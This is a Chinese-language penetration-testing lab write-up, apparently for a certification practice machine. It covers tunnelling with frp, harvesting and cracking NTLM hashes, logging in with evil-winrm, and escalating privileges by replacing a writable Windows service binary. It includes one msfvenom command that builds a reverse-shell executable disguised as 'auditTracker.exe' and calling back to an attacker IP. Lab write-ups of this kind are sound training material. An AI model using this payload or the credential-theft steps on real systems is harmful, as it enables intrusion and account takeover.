## 因為是內網，所以用 frp 架 socket
## nmap scanning
- <img width="1920" height="780" alt="image" src="https://github.com/user-attachments/assets/e20fe6e3-8315-447e-8e27-0ea520f6a1eb" />

## 445 port
- smbclient 無法匿名登入
  - <img width="1285" height="200" alt="image" src="https://github.com/user-attachments/assets/d642f29f-a24f-4626-909b-43738a897743" />

## 5985 port
- 用 mimikatz 在 .121 發現的 NTLM 和 .11 發現的 NTLM ，搭配 .121 發現的 username 都沒有用
- 最後在 .11 C:\users\joe\Documents>fileMonitorBackup.log 發現了很多 user 的 NTLM，其中有 wario 的 NTLM
  - <img width="1606" height="307" alt="image" src="https://github.com/user-attachments/assets/9496fc1a-46b7-4838-b297-79416e0ec258" />
  - <img width="1920" height="267" alt="image" src="https://github.com/user-attachments/assets/8d4f38b8-378e-4ee0-b5a3-682593f8a81d" />
  - <img width="1920" height="211" alt="image" src="https://github.com/user-attachments/assets/c5967efd-ad1a-491d-ad56-a6c5ab7ef66b" />
  - <img width="1920" height="339" alt="image" src="https://github.com/user-attachments/assets/aff9df95-9ced-4d74-b081-a67dbb2d5a63" />
  - <img width="1914" height="314" alt="image" src="https://github.com/user-attachments/assets/36fd4dbb-04a9-4959-9503-e7ad47329faa" />
- 無法直接用 NTLM 登入 wario
  - <img width="1920" height="668" alt="image" src="https://github.com/user-attachments/assets/fef05edb-7ae6-4ef2-a742-f8e5a0533e9e" />
- 成功解 wario 的 NTLM
  - <img width="1920" height="865" alt="image" src="https://github.com/user-attachments/assets/f1d18d64-5d43-41d2-9c66-0db23d5b79ae" />
- 成功用 evil-winrm 登入 wario
  - <img width="1771" height="410" alt="image" src="https://github.com/user-attachments/assets/34bb20b4-755d-4394-80c7-0a1f5c273dca" />
- 取得 local.txt
  - <img width="980" height="62" alt="image" src="https://github.com/user-attachments/assets/baac0342-540e-4807-beff-0bf611473d36" />

## 提權
- winpeas.exe 發現可以利用不安全的 Windows 服務權限，改服務的程式碼來取得reverse shell
  - <img width="1920" height="157" alt="image" src="https://github.com/user-attachments/assets/bdbd563b-c3ff-4af2-a4e9-7ad67344b5bc" />
- 發現顯示 C:\DevelopmentExecutables 目錄有「寫入權限」給所有 Authenticated Users
  - <img width="1920" height="222" alt="image" src="https://github.com/user-attachments/assets/d5659fe3-3ad3-46e1-8d0f-6c7f6a255a90" />
- 上傳 reverse shell 檔名為 auditTracker.exe
  ```
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.232 LPORT=4545 -f exe -o auditTracker.exe
  ```
  - <img width="1418" height="156" alt="image" src="https://github.com/user-attachments/assets/a8453e2e-9a0b-46e0-84f2-5351b6b290f6" />
- 先關閉服務，在啟動服務
  - <img width="1295" height="272" alt="image" src="https://github.com/user-attachments/assets/406324d4-fdc9-4cf8-a5d6-a739803d2d6f" />
- 成功提權
  - <img width="1903" height="351" alt="image" src="https://github.com/user-attachments/assets/29698953-1bb7-4030-897e-97bcf65ae54a" />
- 取得 proof.txt
  - <img width="1114" height="105" alt="image" src="https://github.com/user-attachments/assets/e61db124-9374-49b3-9ecf-4f1bdb25dd3f" />
















































